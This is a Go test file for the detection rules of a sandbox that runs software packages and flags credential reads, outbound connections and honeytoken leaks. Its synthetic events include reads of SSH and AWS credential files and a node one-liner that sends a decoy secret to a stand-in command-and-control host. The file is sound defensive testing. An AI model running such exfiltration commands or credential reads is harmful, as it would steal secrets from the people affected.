// SPDX-License-Identifier: AGPL-3.0-or-later
package rules

import (
	"testing"

	"detonation/internal/honeytokens"
	"detonation/internal/trace"
)

func TestEngineNoEvents(t *testing.T) {
	eng := NewEngine(AllRules())
	findings := eng.Evaluate(nil)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestEngineMultipleMatches(t *testing.T) {
	// The chain end-to-end: the .ssh read arms run_sensitive_access, so the EXTERNAL
	// import connect convicts as dyn_import_exfil; the .ssh read also fires
	// dyn_credential_read; the stdlib open matches nothing.
	events := []trace.TraceEvent{
		{Phase: "import", Category: "network", Operation: "connect",
			Detail: map[string]interface{}{"addr": "45.33.32.156", "port": float64(443)}},
		{Phase: "import", Category: "file", Operation: "open",
			Detail: map[string]interface{}{"path": "/root/.ssh/id_rsa"}},
		{Phase: "import", Category: "file", Operation: "open",
			Detail: map[string]interface{}{"path": "/usr/lib/python3.11/os.py"}},
	}

	eng := NewEngine(AllRules())
	findings := eng.Evaluate(events)

	ruleIDs := map[string]bool{}
	for _, f := range findings {
		ruleIDs[f.RuleID] = true
	}

	if !ruleIDs["dyn_import_exfil"] {
		t.Error("expected dyn_import_exfil (secret read armed the external egress)")
	}
	if !ruleIDs["dyn_credential_read"] {
		t.Error("expected dyn_credential_read")
	}
	if len(findings) != 2 {
		t.Errorf("expected 2 findings, got %d", len(findings))
	}
}

func TestEngineLoneEgressDoesNotConvict(t *testing.T) {
	// External import connects with NO secret access -> low dyn_import_egress note,
	// never dyn_import_exfil. This is the FP class (legit fetches / DNS) that used to
	// flip clean packages.
	events := []trace.TraceEvent{
		{Phase: "import", Category: "network", Operation: "connect",
			Detail: map[string]interface{}{"addr": "45.33.32.156", "port": float64(443)}},
		{Phase: "import", Category: "network", Operation: "connect",
			Detail: map[string]interface{}{"addr": "104.16.0.1", "port": float64(443)}},
	}
	eng := NewEngine(AllRules())
	findings := eng.Evaluate(events)

	egress, exfil := 0, 0
	for _, f := range findings {
		switch f.RuleID {
		case "dyn_import_egress":
			egress++
			if f.Severity != "low" {
				t.Errorf("dyn_import_egress severity = %q, want low", f.Severity)
			}
		case "dyn_import_exfil":
			exfil++
		}
	}
	if exfil != 0 {
		t.Errorf("lone egress must not convict as exfil, got %d", exfil)
	}
	if egress != 1 {
		t.Errorf("expected 1 deduplicated dyn_import_egress note, got %d", egress)
	}
}

func TestEngineSandboxDNSForwarderIgnored(t *testing.T) {
	// 172.17.0.2:53 — the sandbox DNS forwarder — must never produce a finding,
	// even alongside a secret read (it is infra, not egress). Regression guard for
	// the FP flood that flipped clean packages (@bwo-ui/*, actiondock, @oratis/lisa).
	events := []trace.TraceEvent{
		{Phase: "install", Category: "file", Operation: "open",
			Detail: map[string]interface{}{"path": "/root/.aws/credentials"}},
		{Phase: "install", Category: "network", Operation: "connect",
			Detail: map[string]interface{}{"addr": "172.17.0.2", "port": float64(53)}},
	}
	eng := NewEngine(AllRules())
	for _, f := range eng.Evaluate(events) {
		if f.RuleID == "dyn_install_exfil" || f.RuleID == "dyn_install_egress" {
			t.Errorf("DNS forwarder connect must not produce %s", f.RuleID)
		}
	}
}

// The harness launches the sandbox with `docker run -e DECOY=… -v …/.env:/root/.env`,
// so that host-side exec's argv carries every planted env decoy by construction. It is
// traced + attributed to the detonation but is NOT guest behavior — evaluating it
// self-matched the honeytoken canary (the long discord_webhook env value) on EVERY
// detonation, flipping legit packages (microsoft-kiota, golang/dep, gopherjs…) to
// malicious. 2026-06-08 FP cascade.
func harnessLaunchExec(extraArgs string) trace.TraceEvent {
	return trace.TraceEvent{
		Phase: "install", Category: "process", Operation: "exec",
		Detail: map[string]interface{}{
			"binary":    "/usr/bin/docker",
			"arguments": "run --rm --network=bridge --name=det-abc123 --memory=512m " + extraArgs,
		},
	}
}

func TestHoneytokenIgnoresHarnessLaunchCommand(t *testing.T) {
	cans := honeytokens.Canaries()
	if len(cans) == 0 {
		t.Skip("no canaries generated")
	}
	decoy := cans[0].Value // longest decoy (discord_webhook) — the one that self-matched
	evt := harnessLaunchExec("-e DISCORD_WEBHOOK_URL=" + decoy + " -v /tmp/x/.env:/root/.env:ro")
	eng := NewEngine([]Rule{honeytokenExfil()})
	if f := eng.Evaluate([]trace.TraceEvent{evt}); len(f) != 0 {
		t.Fatalf("the harness's own docker-run launch must NOT trip the honeytoken canary, got %+v", f)
	}
}

func TestHoneytokenStillCatchesGuestExfil(t *testing.T) {
	cans := honeytokens.Canaries()
	if len(cans) == 0 {
		t.Skip("no canaries generated")
	}
	decoy := cans[0].Value
	// A GUEST process (node, inside the sandbox) that stages a decoy into an exec arg
	// is real theft and must still convict — the fix only excludes the container runtime.
	evt := trace.TraceEvent{
		Phase: "install", Category: "process", Operation: "exec",
		Detail: map[string]interface{}{
			"binary":    "/usr/local/bin/node",
			"arguments": "-e require('https').request('http://c2/x').end('" + decoy + "')",
		},
	}
	eng := NewEngine([]Rule{honeytokenExfil()})
	f := eng.Evaluate([]trace.TraceEvent{evt})
	if len(f) != 1 || f[0].RuleID != "dyn_honeytoken_exfil" {
		t.Fatalf("a guest process staging a decoy for exfil must still convict, got %+v", f)
	}
}

func TestIsHarnessLaunch(t *testing.T) {
	cases := []struct {
		name   string
		evt    trace.TraceEvent
		expect bool
	}{
		{"docker run", harnessLaunchExec(""), true},
		{"guest node", trace.TraceEvent{Category: "process", Operation: "exec",
			Detail: map[string]interface{}{"binary": "/usr/local/bin/node"}}, false},
		{"network connect", trace.TraceEvent{Category: "network", Operation: "connect",
			Detail: map[string]interface{}{"addr": "1.2.3.4"}}, false},
	}
	for _, c := range cases {
		if got := isHarnessLaunch(c.evt); got != c.expect {
			t.Errorf("%s: isHarnessLaunch = %v, want %v", c.name, got, c.expect)
		}
	}
}
